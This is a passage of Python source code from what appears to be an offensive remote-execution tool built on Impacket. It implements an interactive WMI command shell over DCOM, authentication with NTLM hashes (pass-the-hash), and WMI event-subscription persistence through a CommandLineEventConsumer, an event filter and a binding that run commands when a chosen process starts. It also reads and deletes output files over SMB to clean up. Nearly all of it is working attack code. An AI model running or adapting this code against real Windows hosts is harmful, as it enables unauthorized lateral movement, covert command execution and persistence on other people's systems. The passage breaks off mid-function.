            original_tree_id = getattr(self, "tree_id", None)
            original_connected = getattr(self, "is_connected_to_share", False)
            original_current_path = getattr(self, "current_path", "")
            original_relative_path = getattr(self, "relative_path", "")

            # Only connect if we're not already connected to the target share
            need_to_restore = False
            if original_share != share_name or not original_connected:
                # Temporarily connect to target share
                self.connect_share_by_name(share_name)
                need_to_restore = True
                print_debug(f"Temporarily switched to share: {share_name}")
            else:
                print_debug(f"Already connected to target share: {share_name}")

            # Use smblib download to temp file
            import tempfile

            temp_local = tempfile.NamedTemporaryFile(delete=False).name

            self.download(filename, temp_local, echo=False)

            # Read content from temp file
            with open(temp_local, "r", encoding="utf-8", errors="ignore") as f:
                file_content = f.read()

            # Clean up temp file
            os.unlink(temp_local)

            # Restore original share connection and path if we changed it
            if need_to_restore and original_share and original_connected:
                self.connect_share_by_name(original_share)
                # Restore the original path state
                self.current_path = original_current_path
                self.relative_path = original_relative_path
                print_debug(
                    f"Restored original share and path: {original_share} -> {original_current_path}"
                )
            elif need_to_restore:
                # Disconnect if we weren't originally connected
                self.share = original_share
                self.tree_id = original_tree_id
                self.is_connected_to_share = original_connected
                self.current_path = original_current_path
                self.relative_path = original_relative_path

            return file_content.strip()

        except Exception as e:
            print_debug(f"Error reading file from share {share_name}: {e}")
            # Restore original share connection on error
            if original_share and original_connected:
                try:
                    self.connect_share_by_name(original_share)
                except:
                    pass
            return None

    def connect_share_by_name(self, share_name):
        """Connect to share by name - helper method"""
        try:
            self.tree_id = self.conn.connectTree(share_name)
            self.share = share_name
            self.current_path = ""
            self.relative_path = ""
            self.is_connected_to_share = True
            print_debug(f"Connected to share: {share_name}")
        except Exception as e:
            print_debug(f"Failed to connect to share {share_name}: {e}")
            raise

    def _delete_file_from_share(self, filename, share_name):
        """Delete file from a specific share using smblib methods"""
        try:
            print_debug(f"Deleting file {filename} from share {share_name}")

            # Store current share info
            original_share = getattr(self, "share", None)
            original_tree_id = getattr(self, "tree_id", None)
            original_connected = getattr(self, "is_connected_to_share", False)
            original_current_path = getattr(self, "current_path", "")
            original_relative_path = getattr(self, "relative_path", "")

            # Only connect if we're not already connected to the target share
            need_to_restore = False
            if original_share != share_name or not original_connected:
                # Temporarily connect to target share
                self.connect_share_by_name(share_name)
                need_to_restore = True
                print_debug(f"Temporarily switched to share for deletion: {share_name}")
            else:
                print_debug(
                    f"Already connected to target share for deletion: {share_name}"
                )

            # Use smblib delete method
            self.delete(filename)

            # Restore original share connection and path if we changed it
            if need_to_restore and original_share and original_connected:
                self.connect_share_by_name(original_share)
                # Restore the original path state
                self.current_path = original_current_path
                self.relative_path = original_relative_path
                print_debug(
                    f"Restored original share and path after deletion: {original_share} -> {original_current_path}"
                )
            elif need_to_restore:
                # Disconnect if we weren't originally connected
                self.share = original_share
                self.tree_id = original_tree_id
                self.is_connected_to_share = original_connected
                self.current_path = original_current_path
                self.relative_path = original_relative_path

        except Exception as e:
            print_debug(f"Error deleting file from share {share_name}: {e}")
            # Restore original share connection on error
            if original_share and original_connected:
                try:
                    self.connect_share_by_name(original_share)
                except:
                    pass

    def _handle_interactive_dcom_shell(self, args):
        """Handle interactive DCOM WMI shell session"""
        print_info("Starting WMI DCOM interactive shell...")
        print_info("Type 'exit' to quit the WMI shell")
        print_info("Use 'cd <path>' to change directories")

        # Determine shell prompt prefix
        shell_type = getattr(args, "shell", "cmd")
        if shell_type == "powershell":
            prompt_prefix = "PS-WMI"
        else:
            prompt_prefix = "WMI"

        # Initialize current working directory
        current_working_dir = getattr(args, "working_dir", "C:\\")
        print_info(f"Starting directory: {current_working_dir}")

        print()
        session_output = []

        try:
            while True:
                try:
                    # Display prompt with current directory
                    prompt = f"{prompt_prefix} {current_working_dir}> "
                    command = input(prompt).strip()

                    if command.lower() in ["exit", "quit"]:
                        break

                    if not command:
                        continue

                    # Handle cd command locally
                    if command.lower().startswith("cd ") or command.lower() == "cd":
                        new_dir = self._handle_cd_command(command, current_working_dir)
                        if new_dir:
                            current_working_dir = new_dir
                            print_info(f"Changed directory to: {current_working_dir}")
                            session_output.append(f"{prompt}{command}")
                            session_output.append(
                                f"Directory changed to: {current_working_dir}"
                            )
                        else:
                            print_warning("Failed to change directory")
                            session_output.append(f"{prompt}{command}")
                            session_output.append("ERROR: Failed to change directory")
                        continue

                    # Handle pwd command
                    if command.lower() == "pwd":
                        print(current_working_dir)
                        session_output.append(f"{prompt}{command}")
                        session_output.append(current_working_dir)
                        continue

                    # Execute command via DCOM WMI using current directory
                    result = self.execute_wmi_command(
                        command=command,
                        capture_output=not args.no_output,
                        timeout=args.timeout,
                        output_file=None,  # Don't save individual commands to file
                        working_dir=current_working_dir,  # Use current working directory
                        sleep_time=getattr(args, "sleep_time", 1.0),
                        save_name=getattr(args, "save_name", None),
                        raw_command=getattr(args, "raw_command", False),
                        shell=getattr(args, "shell", "cmd"),
                    )

                    if result["success"]:
                        if result.get("output"):
                            print(result["output"])
                            session_output.append(f"{prompt}{command}")
                            session_output.append(result["output"])
                        else:
                            print_info("Command executed (no output captured)")
                            session_output.append(f"{prompt}{command}")
                            session_output.append(
                                "Command executed (no output captured)"
                            )
                    else:
                        print_bad(
                            f"Command failed: {result.get('error', 'Unknown error')}"
                        )
                        session_output.append(f"{prompt}{command}")
                        session_output.append(
                            f"ERROR: {result.get('error', 'Unknown error')}"
                        )

                except KeyboardInterrupt:
                    print()
                    print_info("Use 'exit' to quit WMI DCOM shell")
                    continue
                except EOFError:
                    set_config_value("Extra_Prompt", "")
                    break

            # Save session output if requested (use --output or --save)
            output_file = getattr(args, "output", None) or getattr(args, "save", None)
            if output_file and session_output:
                full_output = "\n".join(session_output)
                self._save_output_to_file(full_output, output_file)
                print_good(f"Session output saved to: {output_file}")

            print_good("WMI DCOM interactive shell session completed")
            return {
                "success": True,
                "output": "\n".join(session_output) if session_output else None,
                "session_commands": len(
                    [
                        line
                        for line in session_output
                        if f"{prompt_prefix} " in line and "> " in line
                    ]
                ),
            }

        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_bad(f"Interactive shell error: {e}")
            return {"success": False, "error": str(e)}

    def _handle_cd_command(self, command, current_dir):
        """Handle cd command and return new directory path"""
        try:
            # Parse cd command
            parts = command.strip().split()

            # Handle 'cd' with no arguments (go to root or user home)
            if len(parts) == 1:
                # For Windows, 'cd' alone shows current directory
                return current_dir

            target_path = parts[1]

            # Handle special cases
            if target_path == ".":
                return current_dir
            elif target_path == "..":
                # Go up one directory
                return self._get_parent_directory(current_dir)
            elif target_path.startswith("..\\") or target_path.startswith("../"):
                # Relative path starting with ..
                parent_dir = self._get_parent_directory(current_dir)
                relative_part = target_path[3:]  # Remove ..\ or ../
                return self._resolve_path(parent_dir, relative_part)
            elif target_path[1:3] == ":\\" or target_path[1:3] == ":/":
                # Absolute path (C:\path)
                return self._normalize_path(target_path)
            elif target_path.startswith("\\"):
                # Root-relative path (\path)
                drive = current_dir.split(":")[0] + ":"
                return self._normalize_path(drive + target_path)
            else:
                # Relative path
                return self._resolve_path(current_dir, target_path)

        except Exception as e:
            print_debug(f"Error handling cd command: {e}")
            return None

    def _get_parent_directory(self, path):
        """Get parent directory of given path"""
        try:
            # Normalize path separators
            path = path.replace("/", "\\")

            # Remove trailing backslash
            if path.endswith("\\") and len(path) > 3:
                path = path[:-1]

            # Find last backslash
            last_slash = path.rfind("\\")

            if last_slash == -1:
                return path  # No parent found
            elif last_slash == 2 and path[1] == ":":
                # Root directory (C:\)
                return path[:3]
            else:
                return path[:last_slash]

        except Exception as e:
            print_debug(f"Error getting parent directory: {e}")
            return path

    def _resolve_path(self, current_dir, relative_path):
        """Resolve relative path against current directory"""
        try:
            # Normalize separators
            current_dir = current_dir.replace("/", "\\")
            relative_path = relative_path.replace("/", "\\")

            # Ensure current_dir doesn't end with backslash (unless root)
            if current_dir.endswith("\\") and len(current_dir) > 3:
                current_dir = current_dir[:-1]

            # Combine paths
            if relative_path.startswith("\\"):
                # Absolute from current drive
                drive = current_dir.split(":")[0] + ":"
                new_path = drive + relative_path
            else:
                # Relative path
                new_path = current_dir + "\\" + relative_path

            return self._normalize_path(new_path)

        except Exception as e:
            print_debug(f"Error resolving path: {e}")
            return None

    def _normalize_path(self, path):
        """Normalize Windows path"""
        try:
            # Replace forward slashes with backslashes
            path = path.replace("/", "\\")

            # Handle multiple consecutive backslashes
            while "\\\\" in path:
                path = path.replace("\\\\", "\\")

            # Handle . and .. in path
            parts = path.split("\\")
            normalized_parts = []

            for part in parts:
                if part == "." or part == "":
                    continue
                elif part == "..":
                    if normalized_parts and normalized_parts[-1] != "..":
                        normalized_parts.pop()
                    else:
                        normalized_parts.append(part)
                else:
                    normalized_parts.append(part)

            # Rebuild path
            if len(normalized_parts) == 0:
                return "C:\\"

            # Handle drive letters
            if len(normalized_parts[0]) == 2 and normalized_parts[0][1] == ":":
                result = "\\".join(normalized_parts)
                if not result.endswith("\\") and len(result) == 2:
                    result += "\\"
                return result
            else:
                return "\\".join(normalized_parts)

        except Exception as e:
            print_debug(f"Error normalizing path: {e}")
            return path

    # WMI Event Consumer Helper Methods

    def _create_wmi_connection(self):
        """Create DCOM connection and WMI services interface for root/cimv2"""

        # Extract credentials properly (reuse DCOM pattern)
        lm_hash = ""
        nt_hash = ""
        if hasattr(self, "ntlm_hash") and self.ntlm_hash:
            if ":" in self.ntlm_hash:
                lm_hash = self.ntlm_hash.split(":")[0]
                nt_hash = self.ntlm_hash.split(":")[1]
            else:
                nt_hash = self.ntlm_hash

        print_debug("Creating DCOM connection for WMI Event Consumer")

        # Create DCOM connection exactly like existing DCOM implementation
        dcom = DCOMConnection(
            self.host,
            self.username,
            getattr(self, "password", ""),
            getattr(self, "domain", ""),
            lm_hash,
            nt_hash,
            aesKey="",
            oxidResolver=True,
            doKerberos=getattr(self, "use_kerberos", False),
        )

        print_debug("DCOM connection established")

        # Create WMI interface
        iInterface = dcom.CoCreateInstanceEx(
            wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
        )
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLevel1Login.RemRelease()

        print_debug("WMI namespace connection successful")

        return dcom, iWbemServices

    def _create_commandline_event_consumer(
        self,
        iWbemServices,
        consumer_name,
        command,
        working_dir=None,
        system_mode=False,
        raw_command=False,
        raw_exec=None,
    ):
        """Create CommandLineEventConsumer (official Microsoft implementation)"""
        print_debug(f"Creating CommandLineEventConsumer: {consumer_name}")

        # Get CommandLineEventConsumer class and spawn instance
        eventConsumer, _ = iWbemServices.GetObject("CommandLineEventConsumer")
        eventConsumer = eventConsumer.SpawnInstance()

        # Set official Microsoft properties according to documentation
        eventConsumer.Name = consumer_name

        # ExecutablePath and CommandLineTemplate setup based on mode
        if raw_exec is not None:
            # --raw-exec [string]: Set ExecutablePath to the provided string value and put command directly in template
            cmd_template = command
            if raw_exec == "":
                # Empty string means blank ExecutablePath
                eventConsumer.ExecutablePath = ""
                print_debug(
                    f"Raw exec mode (--raw-exec ''): Using command directly: {cmd_template}"
                )
                print_debug(f"ExecutablePath set to empty string (blank)")
                print_info(f"✓ ExecutablePath set to empty string (blank)")
            else:
                # Use the provided string as ExecutablePath
                eventConsumer.ExecutablePath = raw_exec
                print_debug(
                    f"Raw exec mode (--raw-exec '{raw_exec}'): Using command directly: {cmd_template}"
                )
                print_debug(f"ExecutablePath set to: {raw_exec}")
                print_info(f"✓ ExecutablePath overwritten to: {raw_exec}")
            print_info(f"✓ CommandLineTemplate set to: {cmd_template}")
        elif raw_command:
            # --raw-command: Use cmd.exe as ExecutablePath but put command directly in template
            cmd_template = command
            eventConsumer.ExecutablePath = "C:\\Windows\\System32\\cmd.exe"
            print_debug(
                f"Raw command mode (--raw-command): Using command directly: {cmd_template}"
            )
            print_debug(f"ExecutablePath set to: C:\\Windows\\System32\\cmd.exe")
            print_info(f"✓ ExecutablePath kept as: {eventConsumer.ExecutablePath}")
            print_info(f"✓ CommandLineTemplate set to: {cmd_template}")
        else:
            # Standard mode: Use cmd.exe wrapper in CommandLineTemplate
            eventConsumer.ExecutablePath = "C:\\Windows\\System32\\cmd.exe"

            if working_dir:
                cmd_template = f'C:\\Windows\\System32\\cmd.exe /c cd /d "{working_dir}" && {command}'
            else:
                cmd_template = f"C:\\Windows\\System32\\cmd.exe /c {command}"

            print_debug(f"Standard mode: Using cmd.exe wrapper: {cmd_template}")
            print_debug(f"ExecutablePath set to: C:\\Windows\\System32\\cmd.exe")

        eventConsumer.CommandLineTemplate = cmd_template
        print_debug(f"CommandLineTemplate: {cmd_template}")

        # KillTimeout: How long WMI waits before terminating process (Microsoft default: 0)
        eventConsumer.KillTimeout = 0

        # Priority: Process thread scheduling priority (Microsoft default: Normal)
        eventConsumer.Priority = 32  # NORMAL_PRIORITY_CLASS

        # RunInteractively: Whether process launches in interactive WinStation
        # False = service context, True = interactive context
        eventConsumer.RunInteractively = not system_mode

        # CreatorSID: Security identifier (Microsoft requirement for authentication)
        eventConsumer.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        print_debug(f"Consumer properties:")
        print_debug(f"  ExecutablePath: {eventConsumer.ExecutablePath}")
        print_debug(f"  RunInteractively: {eventConsumer.RunInteractively}")
        print_debug(f"  Priority: {eventConsumer.Priority}")
        print_debug(f"  Raw exec mode: {raw_exec}")
        print_debug(f"  Raw command mode: {raw_command}")

        # Create the consumer object in root\subscription
        iWbemServices.PutInstance(eventConsumer.marshalMe())
        print_debug(f"CommandLineEventConsumer created: {consumer_name}")

        # Return the object path for binding
        return f'CommandLineEventConsumer.Name="{consumer_name}"'

    def _create_official_event_filter(
        self, iWbemServices, filter_name, trigger_exe="notepad.exe"
    ):
        """Create __EventFilter (official Microsoft implementation)"""
        print_debug(f"Creating __EventFilter: {filter_name}")

        # Extract just the filename from the path for WMI TargetInstance.Name
        if "\\" in trigger_exe:
            trigger_filename = trigger_exe.split("\\")[-1]
        else:
            trigger_filename = trigger_exe

        print_debug(f"Event Filter will watch for process name: {trigger_filename}")

        # Official Microsoft WQL syntax for __InstanceCreationEvent
        # Using WITHIN 10 for reliable detection (Microsoft recommendation)
        filter_wql = f"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '{trigger_filename}'"
        print_debug(f"WQL Filter: {filter_wql}")

        # Get __EventFilter class and spawn instance
        eventFilter, _ = iWbemServices.GetObject("__EventFilter")
        eventFilter = eventFilter.SpawnInstance()

        # Set official Microsoft properties according to documentation
        eventFilter.Name = filter_name
        eventFilter.Query = filter_wql
        eventFilter.QueryLanguage = "WQL"  # Microsoft requirement: must be "WQL"
        eventFilter.EventNamespace = "root\\cimv2"  # Microsoft default namespace

        # CreatorSID: Security identifier (Microsoft requirement)
        eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        print_debug(f"Event Filter configuration:")
        print_debug(f"  Query: {filter_wql}")
        print_debug(f"  EventNamespace: root\\cimv2")
        print_debug(f"  QueryLanguage: WQL")

        # Create the filter object in root\subscription
        iWbemServices.PutInstance(eventFilter.marshalMe())
        print_debug(f"__EventFilter created: {filter_name}")

        # Return the object path for binding
        return f'__EventFilter.Name="{filter_name}"'

    def _create_official_filter_binding(
        self, iWbemServices, filter_path, consumer_path
    ):
        """Create __FilterToConsumerBinding (official Microsoft implementation)"""
        print_debug(
            f"Creating __FilterToConsumerBinding: {filter_path} -> {consumer_path}"
        )

        # Get __FilterToConsumerBinding class and spawn instance
        eventBinding, _ = iWbemServices.GetObject("__FilterToConsumerBinding")
        eventBinding = eventBinding.SpawnInstance()

        # Set official Microsoft properties according to documentation
        eventBinding.Filter = filter_path
        eventBinding.Consumer = consumer_path

        # DeliveryQoS: Event delivery quality of service (Microsoft default: Synchronous)
        eventBinding.DeliveryQoS = 0  # Synchronous delivery

        # DeliverSynchronously: Microsoft recommendation for performance
        eventBinding.DeliverSynchronously = False  # Asynchronous for better performance

        # MaintainSecurityContext: Whether events are delivered in provider's security context
        eventBinding.MaintainSecurityContext = False  # Default Microsoft setting

        # CreatorSID: Security identifier (Microsoft requirement)
        eventBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        print_debug(f"Binding configuration:")
        print_debug(f"  Filter: {filter_path}")
        print_debug(f"  Consumer: {consumer_path}")
        print_debug(f"  DeliverSynchronously: {eventBinding.DeliverSynchronously}")

        # Create the binding object in root\subscription
        result = iWbemServices.PutInstance(eventBinding.marshalMe())
        print_debug(f"__FilterToConsumerBinding created successfully")

        return result

    def _create_wmi_connection_for_event_consumer(self):
        """Create DCOM connection and WMI services interface for root/subscription namespace"""

        # Extract credentials properly (reuse DCOM pattern)
        lm_hash = ""
        nt_hash = ""
        if hasattr(self, "ntlm_hash") and self.ntlm_hash:
            if ":" in self.ntlm_hash:
                lm_hash = self.ntlm_hash.split(":")[0]
                nt_hash = self.ntlm_hash.split(":")[1]
            else:
                nt_hash = self.ntlm_hash

        print_debug("Creating DCOM connection for WMI Event Consumer")

        # Create DCOM connection exactly like existing DCOM implementation
        dcom = DCOMConnection(
            self.host,
            self.username,
            getattr(self, "password", ""),
            getattr(self, "domain", ""),
            lm_hash,
            nt_hash,
            aesKey="",
            oxidResolver=True,
            doKerberos=getattr(self, "use_kerberos", False),
        )

        print_debug("DCOM connection established")

        # Create WMI interface for root\subscription namespace (required for Event Consumer objects)
        # NAMESPACE RESEARCH: Based on MDSec + Impacket analysis, this is correct:
        # - Login: root/subscription (where Event Consumers are stored)
        # - EventNamespace: root/cimv2 (where events are monitored)
        iInterface = dcom.CoCreateInstanceEx(
            wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
        )
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/subscription", NULL, NULL)
        # ALTERNATIVE TEST: iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLevel1Login.RemRelease()

        print_verbose("WMI subscription namespace accessed (Event Consumer artifacts)")

        return dcom, iWbemServices

    def _create_event_filter(
        self, iWbemServices, filter_name, trigger_exe="notepad.exe"
    ):
        """Create WMI Event Filter for triggering"""

        # Use legitimate system event as trigger (process creation)
        # Use user-specified trigger executable or default to notepad.exe
        print_debug(f"Creating Event Filter with trigger: {trigger_exe}")

        # Extract just the filename from the path for WMI TargetInstance.Name
        if "\\" in trigger_exe:
            trigger_filename = trigger_exe.split("\\")[-1]
        else:
            trigger_filename = trigger_exe

        print_debug(f"Event Filter will watch for process name: {trigger_filename}")

        # CRITICAL FIX: Use case-insensitive matching and proper polling interval
        # 1. WITHIN 2 for reliable detection (WITHIN 1 can be too fast for some systems)
        # 2. Use UPPER() for case-insensitive matching to catch NOTEPAD.EXE, notepad.exe, etc.
        trigger_filename_upper = trigger_filename.upper()
        filter_wql = f"SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Process' AND UPPER(TargetInstance.Name) = '{trigger_filename_upper}'"
        print_debug(f"WQL Filter: {filter_wql}")
        print_debug(f"Case-insensitive match for: {trigger_filename_upper}")

        print_debug(f"Creating Event Filter: {filter_name}")
        print_debug(f"Filter WQL: {filter_wql}")

        # WMIPERSIST MIRROR: Get __EventFilter and spawn instance (exact pattern)
        eventFilter, _ = iWbemServices.GetObject("__EventFilter")
        eventFilter = eventFilter.SpawnInstance()

        # WMIPERSIST MIRROR: Set properties exactly like wmipersist.py
        eventFilter.Name = filter_name
        eventFilter.Query = filter_wql
        eventFilter.QueryLanguage = "WQL"
        eventFilter.EventNamespace = "root\\cimv2"
        print_debug(f"EventNamespace set to: {eventFilter.EventNamespace}")

        # WMIPERSIST MIRROR: Set CreatorSID exactly like wmipersist.py
        eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        print_debug(f"Event Filter configuration:")
        print_debug(f"  Query: {filter_wql}")
        print_debug(f"  EventNamespace: root\\cimv2")
        print_debug(f"  QueryLanguage: WQL")

        # Create the object in root\subscription
        print_debug("Putting __EventFilter...")
        filter_result = iWbemServices.PutInstance(eventFilter.marshalMe())
        print_debug(f"Event Filter created: {filter_name}")
        print_debug(
            f"Filter created: Name={filter_name}, Query={filter_wql}, Namespace=root\\cimv2"
        )

        # Verify the Event Filter was created correctly and is active
        try:
            # Fix: GetObject returns a tuple (object, result), get the first element
            filter_result = iWbemServices.GetObject(
                f"__EventFilter.Name='{filter_name}'"
            )
            if isinstance(filter_result, tuple):
                created_filter = filter_result[0]
            else:
                created_filter = filter_result
            print_debug(f"Event Filter verified: {created_filter.Name}")
            print_debug(
                f"Event Filter active namespace: {created_filter.EventNamespace}"
            )
            print_debug(f"Event Filter query: {created_filter.Query}")
            print_debug(f"Event Filter monitoring Win32_Process creation events")
        except Exception as e:
            print_debug(f"Event Filter verification failed: {e}")

        return filter_result

    def _create_consumer_binding(self, iWbemServices, filter_name, consumer_name):
        """Create FilterToConsumerBinding to link filter and consumer"""

        print_debug(
            f"Creating FilterToConsumerBinding: {filter_name} -> {consumer_name}"
        )

        # WMIPERSIST MIRROR: Get __FilterToConsumerBinding and spawn instance (exact pattern)
        eventBinding, _ = iWbemServices.GetObject("__FilterToConsumerBinding")
        eventBinding = eventBinding.SpawnInstance()

        # WMIPERSIST MIRROR: Use string references exactly like wmipersist.py
        # Impacket expects string references, not object references
        filter_ref = f'__EventFilter.Name="{filter_name}"'
        consumer_ref = f'CommandLineEventConsumer.Name="{consumer_name}"'

        # WMIPERSIST MIRROR: Set properties exactly like wmipersist.py
        eventBinding.Filter = filter_ref
        eventBinding.Consumer = consumer_ref
        eventBinding.DeliverSynchronously = False  # Microsoft recommends False

        # WMIPERSIST MIRROR: Set CreatorSID exactly like wmipersist.py
        eventBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        # Create the binding object in root\subscription
        result = iWbemServices.PutInstance(eventBinding.marshalMe())
        print_debug(f"FilterToConsumerBinding created successfully")

        return result

    def _create_consumer_binding_with_paths(
        self, iWbemServices, filter_obj_path, consumer_obj_path
    ):
        """Create FilterToConsumerBinding using object paths (like your working example)"""

        print_debug(f"Creating FilterToConsumerBinding with object paths")
        print_debug(f"Filter path: {filter_obj_path}")
        print_debug(f"Consumer path: {consumer_obj_path}")

        # Create __FilterToConsumerBinding using object paths pattern
        eventBinding, _ = iWbemServices.GetObject("__FilterToConsumerBinding")
        eventBinding = eventBinding.SpawnInstance()

        # Use the actual object paths returned from PutInstance (your proven pattern)
        eventBinding.Filter = filter_obj_path
        eventBinding.Consumer = consumer_obj_path
        eventBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

        # Create the binding
        print_debug("Putting __FilterToConsumerBinding...")
        binding_result, binding_obj_path = iWbemServices.PutInstance(
            eventBinding.marshalMe()
        )
        print_debug(f"FilterToConsumerBinding created: {binding_obj_path}")

        return binding_result

    def _trigger_event_consumer(self, dcom, trigger_exe="notepad.exe"):
        """Trigger the event filter by spawning target process using Win32_Process.Create"""

        print_debug(
            f"Triggering event consumer by spawning {trigger_exe} using Win32_Process.Create"
        )

        try:
            # Use Win32_Process.Create directly for more reliable process spawning
            # This is more suitable for GUI applications like calc.exe

            # Connect to root\cimv2 namespace for process creation
            iInterface = dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()

            # Set up full path for the trigger executable
            if "\\" in trigger_exe:
                # User provided full path, use as-is
                full_path = trigger_exe
            else:
                # Bare executable name, assume it's in System32
                full_path = f"C:\\Windows\\System32\\{trigger_exe}"

            print_debug(f"Using full path for trigger: {full_path}")

            # Create the process using Win32_Process.Create
            win32_process, _ = iWbemServices.GetObject("Win32_Process")
            result, process_id = win32_process.Create(
                CommandLine=full_path,
                CurrentDirectory=None,
                ProcessStartupInformation=None,
            )

            print_debug(f"Win32_Process.Create result: {result}, PID: {process_id}")
            print_debug(
                f"[CREATEPROCESS DEBUG] ReturnValue={result}, ProcessId={process_id}"
            )

            # Create result object
            class TriggerResult:
                def __init__(self, return_value, pid=None):
                    self.ReturnValue = return_value
                    self.ProcessId = pid

            if result == 0:
                print_debug(
                    f"Event trigger executed successfully - {trigger_exe} spawned with PID {process_id}"
                )
                print_verbose(
                    f"Triggered {trigger_exe} (PID: {process_id}) to activate Event Filter"
                )
                return TriggerResult(0, process_id)
            else:
                print_debug(f"Event trigger failed with return code: {result}")
                print_verbose(
                    f"Failed to trigger {trigger_exe} - Event Consumer may still work if triggered manually"
                )
                return TriggerResult(result)

        except Exception as trigger_error:
            print_debug(f"Event trigger failed: {trigger_error}")
            print_verbose(f"Trigger exception: {trigger_error}")

            # Fallback to original method - spawn the ACTUAL process the filter is watching for
            print_debug("Falling back to original trigger method")
            try:
                # Don't use "cmd /c" - spawn the actual process directly so the filter detects it
                # The filter is watching for NOTEPAD.EXE, so we need to spawn notepad.exe directly
                trigger_command = trigger_exe
                print_debug(
                    f"Direct trigger command (no cmd wrapper): {trigger_command}"
                )
                result = self.execute_wmi_command(
                    command=trigger_command,
                    capture_output=False,
                    timeout=10,
                )

                class TriggerResult:
                    def __init__(self, success):
                        self.ReturnValue = 0 if success else -1
                        self.ProcessId = None

                return TriggerResult(result and result.get("success"))

            except Exception as fallback_error:
                print_debug(f"Fallback trigger also failed: {fallback_error}")

            # Try alternative trigger method as fallback
            try:
                print_debug("Attempting alternative trigger method...")
                return self._trigger_event_consumer_simple(dcom)
            except Exception as alt_error:
                print_debug(f"Alternative trigger also failed: {alt_error}")

                # Return a mock result indicating both trigger attempts failed
                class MockResult:
                    ReturnValue = -1
                    ProcessId = None

                return MockResult()

    def _trigger_event_consumer_simple(self, dcom):
        """Simplified trigger method using basic WMI process creation"""

        print_debug("Using simplified trigger method")

        try:
            # Create fresh WMI interface for root\\cimv2
            iInterface = dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()

            print_debug("✓ Connected to root\\cimv2 (simplified method)")

            # Get Win32_Process class
            win32Process, _ = iWbemServices.GetObject("Win32_Process")
            print_debug("✓ Retrieved Win32_Process class (simplified method)")

            # Very basic trigger - just spawn cmd.exe
            trigger_command = "cmd.exe"
            print_debug(f"Simplified trigger command: {trigger_command}")

            # Call Create method with minimal parameters
            result = win32Process.Create(trigger_command)

            return_value = result.ReturnValue if hasattr(result, "ReturnValue") else -1
            process_id = result.ProcessId if hasattr(result, "ProcessId") else None

            print_debug(
                f"Simplified creation result: ReturnValue={return_value}, ProcessId={process_id}"
            )

            if return_value == 0:
                print_debug(f"✓ Simplified trigger succeeded (PID: {process_id})")
            else:
                print_debug(
                    f"✗ Simplified trigger failed with return code: {return_value}"
                )

            return result

        except Exception as simple_error:
            print_debug(f"Simplified trigger failed: {simple_error}")

            # Return failure result
            class MockResult:
                ReturnValue = -1
                ProcessId = None

            return MockResult()

    def _wait_for_event_execution(self, output_path, timeout):
        """Wait for event consumer execution and capture output"""

        if not output_path:
            return "Event consumer executed (no output captured)"

        print_debug(f"Waiting for output file: {output_path}")

        # Wait for output file to be created and populated
        start_time = time.time()
        output_text = None
        attempt = 0

        while time.time() - start_time < timeout:
            attempt += 1
            try:
                # Try to read output file using existing SMB methods
                output_text = self._read_output_file_smb(output_path)
                if output_text and output_text.strip():
                    print_verbose(
                        f"Event consumer output captured (filesystem artifact)"
                    )
                    print_debug(f"Output content preview: {output_text[:100]}")
                    # Clean up remote output file
                    self._delete_output_file_smb(output_path)
                    return output_text.strip()
                else:
                    print_debug(
                        f"Attempt {attempt}: Output file exists but empty or no content"
                    )
            except Exception as e:
                print_debug(f"Output capture attempt {attempt} failed: {e}")
                # Add specific check for file not found vs other errors
                if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    print_debug(f"Attempt {attempt}: Output file not created yet")
                else:
                    print_debug(f"Attempt {attempt}: Unexpected error: {e}")

            time.sleep(2)  # Increase wait between attempts

        print_debug(f"Timeout waiting for event consumer output ({timeout}s)")
        print_debug("Event Consumer may have executed but output file not created")
        print_debug("This could indicate:")
        print_debug("1. Event Consumer executed but command failed")
        print_debug("2. Event Consumer never triggered (WMI Event detection issue)")
        print_debug("3. Output redirection in batch file failed")
        print_debug("4. File permissions preventing output file creation")
        return "Event consumer executed (timeout waiting for output)"

    def _read_output_file_smb(self, file_path):
        """Read output file from remote system using smblib methods"""
        try:
            # Parse the full file path - Event Consumer writes to C:\Users\username\AppData\Local\Temp\filename
            if "Users\\" in file_path and "AppData\\Local\\Temp\\" in file_path:
                # Extract the path relative to C$ share: Users\username\AppData\Local\Temp\filename
                # Find the Users part and use everything after C:\
                if file_path.startswith("C:\\"):
                    remote_path = file_path[3:]  # Remove "C:\" prefix
                else:
                    remote_path = file_path
                print_debug(f"SMB path for output file: {remote_path}")
            elif file_path.startswith("C:\\Users\\Public\\Downloads\\"):
                # Extract just the filename for download
                filename = file_path.split("\\")[-1]
                # Download from Users\Public\Downloads directory in C$ share
